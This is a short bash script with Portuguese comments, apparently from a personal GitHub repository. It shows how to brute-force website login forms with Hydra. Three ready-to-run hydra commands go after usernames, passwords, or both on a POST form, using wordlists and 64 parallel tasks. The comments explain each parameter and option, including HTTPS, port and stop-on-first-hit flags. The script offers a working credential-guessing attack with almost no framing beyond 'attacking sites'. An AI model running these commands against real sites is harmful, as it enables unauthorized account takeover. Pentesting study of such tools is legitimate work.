#! /bin/bash

#Autor: Joao Nossol
#github: https://github.com/joaonossolb

#Atacando Sites com formulario de mthod POST com Hydra

#Brute Force no usuario e senha
#hydra -L wordlistUsuarios.txt -P wordlistSenhas.txt <TARGET> http-post-form "/verificar.php:login=^USER^&senha=^PASS^:Login e senha incorretos" -t 64

#Brute Force no usuario
#hydra -L wordlistUsuarios.txt -p senha <TARGET> http-post-form "/verificar.php:login=^USER^&senha=^PASS^:Login e senha incorretos" -t 64
#Brute Force na senha
hydra -l usuario -P wordlistSenhas.txt <TARGET> http-post-form "/verificar.php:login=^USER^&senha=^PASS^:Login e senha incorretos" -t 64


#"/verificar.php:login=^USER --> verificar.php é o caminho da pagina que está no action do form, login é o nome do campo de login do site
#^&senha=^PASS --> senha é o nome do campo de senha do site
#^:Login e senha incorretos" --> Mensagem que aparece quando da errado o login e senha...
# -t --> Número de tentativa consecutivas (ao mesmo tempo) Minimo:1 Maximo: 64
# -S --> É para ser usado em sites que contém https
# -s 80 --> Define, porta do serviço caso não seja a porta default do serviço, mas é possivel definir mesmo sendo a porta default.
# -F --> Se colocar essa opção, o brute force irá parar quando achar o primeiro usuario e senha encontrados na wordlist
# -e nsr --> Coloca o nome de usuario na senha e vice versa
